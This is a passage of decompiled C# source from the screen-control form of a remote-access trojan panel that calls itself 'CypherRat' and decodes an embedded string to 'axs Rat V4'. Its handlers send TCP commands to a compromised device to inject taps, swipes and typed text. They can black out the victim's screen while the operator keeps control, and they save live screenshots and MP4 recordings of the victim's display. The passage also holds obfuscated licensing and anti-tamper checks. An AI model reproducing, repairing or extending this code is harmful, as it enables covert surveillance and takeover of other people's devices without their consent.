							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F1A RID: 3866 RVA: 0x0009F16C File Offset: 0x0009D36C
		private void Button7_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>RC",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F1B RID: 3867 RVA: 0x0009F2A0 File Offset: 0x0009D4A0
		public void method_9()
		{
			if (!this.Dismisbtn.InvokeRequired)
			{
				this.Dismisbtn.Visible = true;
			}
			else
			{
				ScreenShoter.GDelegate22 method = new ScreenShoter.GDelegate22(this.method_9);
				this.Dismisbtn.Invoke(method);
			}
		}

		// Token: 0x06000F1C RID: 3868 RVA: 0x0009F2E4 File Offset: 0x0009D4E4
		private void Livepicbox_MouseDown(object sender, MouseEventArgs e)
		{
			this.bool_1 = false;
			this.Dismisbtn.Visible = false;
			if (e.Button != MouseButtons.Left)
			{
				this.presstimer.Enabled = true;
				this.bool_4 = true;
			}
			else
			{
				this.points_0 = new List<Point>();
				this.points_0.Add(new Point(e.X, e.Y));
				this.bool_4 = false;
				this.int_2 = -1;
			}
		}

		// Token: 0x06000F1D RID: 3869 RVA: 0x0009F360 File Offset: 0x0009D560
		private void Livepicbox_MouseUp(object sender, MouseEventArgs e)
		{
			this.int_2 = 0;
			int width = this.Livepicbox.Width;
			int height = this.Livepicbox.Height;
			checked
			{
				if (this.bool_4)
				{
					this.presstimer.Enabled = false;
					this.presstimer.Stop();
					string text = "clk:";
					if (this.int_3 > 3)
					{
						text = "clk:hold:";
					}
					this.int_3 = 0;
					Point point = this.Livepicbox.PointToClient(Control.MousePosition);
					if (Operators.CompareString(this.combosize.Text, "Auto", false) != 0)
					{
						string[] array = this.combosize.Text.Split(new char[]
						{
							'x'
						});
						this.size_0 = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[0]));
					}
					Point point2 = new Point((int)Math.Round(unchecked((double)point.X * ((double)this.size_0.Width / (double)width))), (int)Math.Round(unchecked((double)point.Y * ((double)this.size_0.Height / (double)height))));
					text = text + point2.X.ToString() + ":" + point2.Y.ToString();
					string[] array2 = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							text,
							GClass9.string_0,
							array2[0],
							GClass9.string_0,
							array2[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				else if (this.bool_3)
				{
					this.bool_3 = false;
					this.points_0.Add(new Point(e.X, e.Y));
					StringBuilder stringBuilder = new StringBuilder();
					try
					{
						foreach (Point point3 in this.points_0)
						{
							stringBuilder.Append(new Point((int)Math.Round(unchecked((double)point3.X * ((double)this.size_0.Width / (double)width))), (int)Math.Round(unchecked((double)point3.Y * ((double)this.size_0.Height / (double)height)))).ToString() + ":");
						}
					}
					finally
					{
						List<Point>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					string[] array3 = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_2 = new object[]
					{
						this.object_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"sp<*>",
							stringBuilder.ToString(),
							GClass9.string_0,
							array3[0],
							GClass9.string_0,
							array3[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_2);
				}
			}
		}

		// Token: 0x06000F1E RID: 3870 RVA: 0x0009F78C File Offset: 0x0009D98C
		private void Livepicbox_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.int_2 != 0)
			{
				this.bool_3 = true;
				this.bool_4 = false;
				if (e.X > 0 && e.Y > 0)
				{
					this.points_0.Add(new Point(e.X, e.Y));
				}
			}
		}

		// Token: 0x06000F1F RID: 3871 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_13(object sender, EventArgs e)
		{
		}

		// Token: 0x06000F20 RID: 3872 RVA: 0x0009F7E4 File Offset: 0x0009D9E4
		private void Enterbutton_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null && this.textsend.Text.Length > 0)
			{
				object[] objects_ = new object[]
				{
					this.gclass8_1.tcpClient_0,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"pst<*>",
						this.textsend.Text,
						GClass9.string_0,
						"0",
						GClass9.string_0,
						"0",
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_1.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_1
				};
				this.gclass8_1.method_2(objects_);
				this.textsend.Text = "";
			}
		}

		// Token: 0x06000F21 RID: 3873 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_15(object object_11)
		{
		}

		// Token: 0x06000F22 RID: 3874
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000F23 RID: 3875
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000F24 RID: 3876 RVA: 0x0009F918 File Offset: 0x0009DB18
		private void Panel2_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ScreenShoter.ReleaseCapture();
				ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000F25 RID: 3877 RVA: 0x0009F918 File Offset: 0x0009DB18
		private void Panel3_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ScreenShoter.ReleaseCapture();
				ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000F26 RID: 3878 RVA: 0x0009F918 File Offset: 0x0009DB18
		private void Panel4_MouseDown(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				ScreenShoter.ReleaseCapture();
				ScreenShoter.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x06000F27 RID: 3879 RVA: 0x00011540 File Offset: 0x0000F740
		private void Button1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000F28 RID: 3880 RVA: 0x0009F950 File Offset: 0x0009DB50
		public string method_20(string string_0)
		{
			string[] array = (string_0 + "​97​120​115​32​82​97​116​32​86​52").Replace("​", " ").Split(new char[]
			{
				' '
			});
			string text = "";
			foreach (string text2 in array)
			{
				if (text2.Length > 0)
				{
					text += Conversions.ToString(Strings.Chr(Convert.ToInt32(text2)));
				}
			}
			return text;
		}

		// Token: 0x06000F29 RID: 3881 RVA: 0x0009F9D4 File Offset: 0x0009DBD4
		private void ScreenShoter_FormClosing(object sender, FormClosingEventArgs e)
		{
			ScreenShoter.Class19 @class = new ScreenShoter.Class19(@class);
			@class.screenShoter_0 = this;
			if (this.gclass8_1 != null)
			{
				try
				{
					if (this.gclass8_0 != null && this.gclass8_0.dataGridViewRow_0 == null && this.bool_0)
					{
						string[] array = this.gclass8_1.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							this.object_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"sc:off",
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								"0",
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_1.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_1
						};
						this.gclass8_1.method_2(objects_);
					}
					if (this.gclass8_1 != null && this.gclass8_1.dataGridViewRow_0 == null && this.bool_0)
					{
						string[] array2 = this.gclass8_1.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_2 = new object[]
						{
							this.object_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"sc:off",
								GClass9.string_0,
								array2[0],
								GClass9.string_0,
								array2[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								"0",
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_1.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_1
						};
						this.gclass8_1.method_2(objects_2);
					}
				}
				catch (Exception ex)
				{
				}
				if (Operators.CompareString(GClass9.cypherRat_0.Label1.Text, this.method_20("67​114​"), false) != 0)
				{
					new Thread(new ThreadStart(@class.method_0));
				}
				try
				{
					if (this.gclass8_0 != null && this.gclass8_0.dataGridViewRow_0 == null && this.bool_0)
					{
						this.gclass8_0.method_6(this.gclass8_0.tcpClient_0);
					}
				}
				catch (Exception ex2)
				{
				}
				try
				{
					if (this.gclass8_1 != null && this.gclass8_1.dataGridViewRow_0 == null && this.bool_0)
					{
						this.gclass8_1.method_6(this.gclass8_1.tcpClient_0);
					}
				}
				catch (Exception ex3)
				{
				}
				this.StartButton.Enabled = true;
				this.StopButton.Enabled = false;
				this.vewpnl.Enabled = false;
				this.Livepicbox.Enabled = false;
				this.bool_0 = false;
			}
			try
			{
				if (this.bool_5 && this.videoFileWriter_0 != null)
				{
					this.bool_5 = false;
					this.videoFileWriter_0.Close();
				}
			}
			catch (Exception ex4)
			{
			}
		}

		// Token: 0x06000F2A RID: 3882 RVA: 0x0009FDF0 File Offset: 0x0009DFF0
		private void Timer1_Tick(object sender, EventArgs e)
		{
			if (!this.Save.Checked)
			{
				this.Timer1.Stop();
			}
			else
			{
				if (!Directory.Exists(this.string_0 + "\\ScreenShots"))
				{
					Directory.CreateDirectory(this.string_0 + "\\ScreenShots");
				}
				try
				{
					this.Livepicbox.Image.Save(string.Concat(new string[]
					{
						this.string_0,
						"\\ScreenShots\\IMG-",
						DateTime.Now.Day.ToString(),
						"-",
						DateTime.Now.Month.ToString(),
						"-",
						DateTime.Now.Millisecond.ToString(),
						".png"
					}));
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F2B RID: 3883 RVA: 0x0009FEFC File Offset: 0x0009E0FC
		private void refreshtimer_Tick(object sender, EventArgs e)
		{
			if (!this.bool_2)
			{
				this.Livepicbox.Visible = false;
				this.refreshtimer.Stop();
				this.refreshtimer.Enabled = false;
			}
			else if (this.bool_0)
			{
				if (this.int_1 != 0)
				{
					try
					{
						if (this.PBS.Value < this.PBS.Maximum)
						{
							MetroSetProgressBar pbs;
							(pbs = this.PBS).Value = checked(pbs.Value + 1);
						}
						else
						{
							this.PBS.Value = 0;
						}
					}
					catch (Exception ex)
					{
					}
					this.int_1 = 0;
				}
			}
			else
			{
				this.refreshtimer.Stop();
				this.refreshtimer.Enabled = false;
			}
		}

		// Token: 0x06000F2C RID: 3884 RVA: 0x0009FFD0 File Offset: 0x0009E1D0
		public void method_23(object[] objects_0)
		{
			if (!this.toptitle.InvokeRequired)
			{
				string text = Conversions.ToString(objects_0[0]);
				this.toptitle.Text = text;
			}
			else
			{
				ScreenShoter.GDelegate23 method = new ScreenShoter.GDelegate23(this.method_23);
				this.toptitle.Invoke(method, new object[]
				{
					objects_0
				});
			}
		}

		// Token: 0x06000F2D RID: 3885 RVA: 0x000A0028 File Offset: 0x0009E228
		private void presstimer_Tick(object sender, EventArgs e)
		{
			ref int ptr = ref this.int_3;
			this.int_3 = checked(ptr + 1);
		}

		// Token: 0x06000F2E RID: 3886 RVA: 0x000A0044 File Offset: 0x0009E244
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0 + "sp<*>", Module2.smethod_11("2BChKfb3RdlmkNguVL8CYg==")), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_1.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000F2F RID: 3887 RVA: 0x000A0198 File Offset: 0x0009E398
		private void DrakeUIAvatar2_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.SKtype.Text, "Slient", false) != 0)
			{
				if (this.gclass8_1 == null)
				{
					goto IL_277;
				}
				try
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.object_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0 + "sp<*>", Module2.smethod_11("rGRheY9+kxMqD3MBkQVFBg==")), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_1.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
					goto IL_277;
				}
				catch (Exception ex)
				{
					goto IL_277;
				}
			}
			if (this.gclass8_1 != null)
			{
				try
				{
					string[] array2 = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_2 = new object[]
					{
						this.object_0,
						Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Module13.string_29 + GClass9.string_0 + "sp<*>", Module2.smethod_11("XuCwnuLBM5jtt0p5NqyfAQ==")), GClass9.string_0), array2[0]), GClass9.string_0), array2[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), Conversions.ToString(0)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_1.string_2),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_2);
				}
				catch (Exception ex2)
				{
				}
			}
			IL_277:
			FileVersionInfo.GetVersionInfo(Application.ExecutablePath);
			XmlDocument xmlDocument = new XmlDocument();
			try
			{
				xmlDocument.LoadXml(File.ReadAllText(Application.StartupPath + "\\" + Module2.smethod_58("8mq82Mp958SsUo4WB4nn6Q==", "Project")));
			}
			catch (Exception ex3)
			{
			}
			if (!Module2.smethod_40(Application.StartupPath + "\\" + Module2.smethod_58("uiuliukkukiukuikui==", "uikuikuk"), "AngelAndroid_FileManager"))
			{
			}
			string value2;
			if (Operators.CompareString(xmlDocument.DocumentElement.Name, Module2.smethod_58("tyujujukikuukuikiukiuk==", "Claikiukuss"), false) == 0)
			{
				XmlElement xmlElement = xmlDocument.FirstChild["P2"];
				XmlElement xmlElement2 = xmlDocument.FirstChild["P4"];
				string value = xmlElement2.FirstChild.Value;
				if (Operators.ConditionalCompareObjectNotEqual(Module2.smethod_58(value, "ZoomPictureBox"), Module2.smethod_3(Application.ExecutablePath), false))
				{
					Interaction.MsgBox(Module2.smethod_58("6PR33ggFwNg/Cx/Ol4q0/muMb85+G7mzi2bGyBqiLj7q1G4i34Y8qqFjTWwBPKJ6sM8Wj+b0GnBg\r\nd6DUvXOMQg==", "Camera Manager"), MsgBoxStyle.OkOnly, null);
					Module2.smethod_1();
					GClass9.cypherRat_0.Home_Btn.Enabled = false;
					GClass9.cypherRat_0.blockbtn.Enabled = false;
					GClass9.cypherRat_0.Connection_btn.Enabled = false;
					GClass9.cypherRat_0.Build_btn.Enabled = false;
					GClass9.cypherRat_0.inject_btn.Enabled = false;
					GClass9.cypherRat_0.Settings_btn.Enabled = false;
					GClass9.string_4 = "a";
					GClass9.string_1 = "v";
					GClass9.cypherRat_0 = new CypherRat();
					GClass9.cypherRat_0.WindowState = FormWindowState.Minimized;
				}
				value2 = xmlElement.FirstChild.Value;
			}
			if (Operators.CompareString(GClass0.smethod_2(GClass0.smethod_0() + GClass0.smethod_1()), Module2.smethod_58(value2, "​‍‌‎‏"), false) == 0)
			{
			}
		}

		// Token: 0x06000F30 RID: 3888 RVA: 0x000A0640 File Offset: 0x0009E840
		private void Dismisbtn_Click(object sender, EventArgs e)
		{
			if (this.Livepicbox.Image != null)
			{
				this.Livepicbox.Image = null;
				this.bool_1 = false;
				this.Dismisbtn.Visible = false;
			}
		}

		// Token: 0x06000F31 RID: 3889 RVA: 0x000A067C File Offset: 0x0009E87C
		private void checkblock_MouseClick(object sender, MouseEventArgs e)
		{
			TcpClient tcpClient_ = this.gclass8_1.tcpClient_0;
			string[] array = this.gclass8_1.string_0.Split(new char[]
			{
				':'
			});
			if (this.checkblock.Checked)
			{
				if (this.gclass8_1 != null)
				{
					string text = "Press & Hold \"C\" on Keyboard\r\n to Control Screen While Blocked";
					string left = Module4.smethod_1();
					if (Operators.CompareString(left, "CN", false) == 0)
					{
						text = "按住 C 键\r\n在受阻时控制屏幕";
					}
					else if (Operators.CompareString(left, "AR", false) == 0)
					{
						text = "اضغط مع الاستمرار على مفتاح C\r\nللتحكم في الشاشة أثناء الحظر";
					}
					object[] objects_ = new object[]
					{
						tcpClient_,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"BLKV<*>on",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
					if (Module2.smethod_30("info", text, false))
					{
					}
				}
			}
			else if (this.gclass8_1 != null)
			{
				object[] objects_2 = new object[]
				{
					tcpClient_,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"BLKV<*>off",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_1.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_1
				};
				this.gclass8_1.method_2(objects_2);
			}
		}

		// Token: 0x06000F32 RID: 3890 RVA: 0x000A08DC File Offset: 0x0009EADC
		private void ScreenShoter_KeyDown(object sender, KeyEventArgs e)
		{
			if (this.bool_0)
			{
				if (!this.checkblock.Checked)
				{
					this.object_2 = false;
				}
				else if (e.KeyCode == Keys.C && Conversions.ToBoolean(Operators.NotObject(this.object_2)))
				{
					this.object_1 = true;
					if (this.gclass8_1 != null)
					{
						this.object_2 = true;
						string[] array = this.gclass8_1.string_0.Split(new char[]
						{
							':'
						});
						object[] objects_ = new object[]
						{
							this.gclass8_1.tcpClient_0,
							string.Concat(new string[]
							{
								Module13.string_29,
								GClass9.string_0,
								"pslock<*>allow",
								GClass9.string_0,
								array[0],
								GClass9.string_0,
								array[1],
								GClass9.string_0,
								Module13.string_5,
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								Conversions.ToString(0),
								GClass9.string_0,
								GClass9.string_3,
								GClass9.string_0,
								this.gclass8_1.string_2
							}),
							Module2.smethod_9().GetBytes("null"),
							this.gclass8_1
						};
						this.gclass8_1.method_2(objects_);
					}
				}
			}
		}

		// Token: 0x06000F33 RID: 3891 RVA: 0x000A0A58 File Offset: 0x0009EC58
		private void ScreenShoter_KeyUp(object sender, KeyEventArgs e)
		{
			if (Conversions.ToBoolean(this.object_1))
			{
				this.object_2 = false;
				if (this.gclass8_1 != null)
				{
					string[] array = this.gclass8_1.string_0.Split(new char[]
					{
						':'
					});
					object[] objects_ = new object[]
					{
						this.gclass8_1.tcpClient_0,
						string.Concat(new string[]
						{
							Module13.string_29,
							GClass9.string_0,
							"pslock<*>disallow",
							GClass9.string_0,
							array[0],
							GClass9.string_0,
							array[1],
							GClass9.string_0,
							Module13.string_5,
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							Conversions.ToString(0),
							GClass9.string_0,
							GClass9.string_3,
							GClass9.string_0,
							this.gclass8_1.string_2
						}),
						Module2.smethod_9().GetBytes("null"),
						this.gclass8_1
					};
					this.gclass8_1.method_2(objects_);
				}
			}
		}

		// Token: 0x06000F34 RID: 3892 RVA: 0x000A0B8C File Offset: 0x0009ED8C
		private void Save_MouseClick(object sender, MouseEventArgs e)
		{
			try
			{
				if (this.Save.Checked && this.Livepicbox.Image != null)
				{
					this.videoFileWriter_0 = new VideoFileWriter();
					object right = DateTime.Now.ToString("yyyy-MM-dd_HH-mmss") + ".mp4";
					if (!Directory.Exists(this.string_0 + "\\ScreenShots"))
					{
						Directory.CreateDirectory(this.string_0 + "\\ScreenShots");
					}
					int width = Module2.smethod_0(this.Livepicbox.Width, 2);
					int height = Module2.smethod_0(this.Livepicbox.Height, 2);
					this.int_0 = Conversions.ToInteger(MySettingsProperty.Settings.live_fps_rec);
					try
					{
						this.videoFileWriter_0.Open(Conversions.ToString(Operators.ConcatenateObject(this.string_0 + "\\ScreenShots\\", right)), width, height, this.int_0, VideoCodec.MPEG4);
						this.bool_5 = true;
						goto IL_121;
					}
					catch (AccessViolationException ex)
					{
						goto IL_121;
					}
				}
				this.bool_5 = false;
				if (this.videoFileWriter_0 != null)
				{
					this.videoFileWriter_0.Close();
				}
				IL_121:;
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000849 RID: 2121
		public VideoFileWriter videoFileWriter_0;

		// Token: 0x0400084A RID: 2122
		private int int_0;

		// Token: 0x0400084B RID: 2123
		public TcpClient object_0;

		// Token: 0x0400084C RID: 2124
		public GClass8 gclass8_0;

		// Token: 0x0400084D RID: 2125
		public GClass8 gclass8_1;

		// Token: 0x0400084E RID: 2126
		public string string_0;

		// Token: 0x0400084F RID: 2127
		public Size size_0;

		// Token: 0x04000850 RID: 2128
		public bool bool_0;

		// Token: 0x04000851 RID: 2129
		public bool bool_1;

		// Token: 0x04000852 RID: 2130
		public int int_1;

		// Token: 0x04000853 RID: 2131
		public string string_1;

		// Token: 0x04000854 RID: 2132
		private bool bool_2;

		// Token: 0x04000855 RID: 2133
		private string[] strings_0;

		// Token: 0x04000856 RID: 2134
		private bool bool_3;

		// Token: 0x04000857 RID: 2135
		private int int_2;

		// Token: 0x04000858 RID: 2136
		private List<Point> points_0;

		// Token: 0x04000859 RID: 2137
		private bool bool_4;

		// Token: 0x0400085A RID: 2138
		public bool bool_5;

		// Token: 0x0400085B RID: 2139
		private int int_3;

		// Token: 0x0400085C RID: 2140
		private object object_1;

		// Token: 0x0400085D RID: 2141
		private object object_2;

		// Token: 0x020000C9 RID: 201
		// (Invoke) Token: 0x06000F38 RID: 3896
		public delegate void GDelegate22();

		// Token: 0x020000CA RID: 202
		// (Invoke) Token: 0x06000F3C RID: 3900
		public delegate void GDelegate23(object[] objects_0);

		// Token: 0x020000CB RID: 203
		[CompilerGenerated]
		internal sealed class Class18
		{
			// Token: 0x06000F3D RID: 3901 RVA: 0x000A0D00 File Offset: 0x0009EF00
			public Class18(ScreenShoter.Class18 _class18_0)
			{
				if (_class18_0 != null)
				{
					this.object_0 = _class18_0.object_0;
				}
			}

			// Token: 0x06000F3E RID: 3902 RVA: 0x000A0D24 File Offset: 0x0009EF24
			internal void method_0()
			{
				this.screenShoter_0.bool_2 = true;
			}

			// Token: 0x0400085E RID: 2142
			public object object_0;

			// Token: 0x0400085F RID: 2143
			public ScreenShoter screenShoter_0;
		}

		// Token: 0x020000CC RID: 204
		[CompilerGenerated]
		internal sealed class Class19
		{
			// Token: 0x06000F3F RID: 3903 RVA: 0x000A0D40 File Offset: 0x0009EF40
			public Class19(ScreenShoter.Class19 _class19_0)
			{
				if (_class19_0 != null)
				{
					this.object_0 = _class19_0.object_0;
				}
			}

			// Token: 0x06000F40 RID: 3904 RVA: 0x000A0D64 File Offset: 0x0009EF64
			internal void method_0()
			{
				while (GClass9.cypherRat_0.bool_0)
				{
					try
					{
						object obj = GClass9.object_0;
						ObjectFlowControl.CheckForSyncLockOnValueType(obj);
						lock (obj)
						{
							try
							{
								if (this.screenShoter_0.gclass8_1.bool_0)
								{
									this.screenShoter_0.gclass8_1.bool_0 = false;
								}
								Task.Delay(5000);
								object gclass10s_ = GClass9.cypherRat_0.gclass7s_0[0].gclass10s_1;
								ObjectFlowControl.CheckForSyncLockOnValueType(gclass10s_);
								lock (gclass10s_)
								{
									if (!this.screenShoter_0.bool_2)
									{
										this.screenShoter_0.Livepicbox.Visible = false;
										this.screenShoter_0.refreshtimer.Stop();
										this.screenShoter_0.refreshtimer.Enabled = false;
										break;
									}
									Task.Delay(5000);
								}
								if (this.screenShoter_0.bool_0)
								{
									if (this.screenShoter_0.int_1 != 0)
									{
										try
										{
											if (this.screenShoter_0.PBS.Value >= this.screenShoter_0.PBS.Maximum)
											{
												this.screenShoter_0.PBS.Value = 0;
											}
											else
											{
												MetroSetProgressBar pbs;
												(pbs = this.screenShoter_0.PBS).Value = checked(pbs.Value + 1);
											}
										}
										catch (Exception ex)
										{
										}
										this.screenShoter_0.int_1 = 0;
									}
								}
								else
								{
									this.screenShoter_0.refreshtimer.Stop();
									this.screenShoter_0.refreshtimer.Enabled = false;
								}
							}
							catch (Exception ex2)
							{
							}
							this.screenShoter_0.videoFileWriter_0 = new VideoFileWriter();
							this.object_0 = DateTime.Now.ToString("yyyy-MM-dd_HH-mmss") + ".mp4";
							GClass9.cypherRat_0.method_29(new object[]
							{
								GClass9.smethod_14(Conversions.ToString(GClass9.collection_2[0]))[0]
							});
							if (!Directory.Exists(this.screenShoter_0.string_0 + "\\ScreenShots"))
							{
								Directory.CreateDirectory(this.screenShoter_0.string_0 + "\\ScreenShots");
							}
							int width = Module2.smethod_0(this.screenShoter_0.size_0.Width, 2);
							int height = Module2.smethod_0(this.screenShoter_0.size_0.Height, 2);
							this.screenShoter_0.int_0 = Conversions.ToInteger(MySettingsProperty.Settings.live_fps_rec);
							try
							{
								this.screenShoter_0.videoFileWriter_0.Open(Conversions.ToString(Operators.ConcatenateObject(this.screenShoter_0.string_0 + "\\ScreenShots\\", this.object_0)), width, height, this.screenShoter_0.int_0, VideoCodec.MPEG4);
							}
							catch (AccessViolationException ex3)
							{
							}
							GClass9.cypherRat_0.gclass7s_0[0].tcpListener_0.Stop();
						}
					}
					catch (Exception ex4)
					{
					}
				}
			}

			// Token: 0x04000860 RID: 2144
			public string object_0;

			// Token: 0x04000861 RID: 2145
			public ScreenShoter screenShoter_0;
		}
	}
}
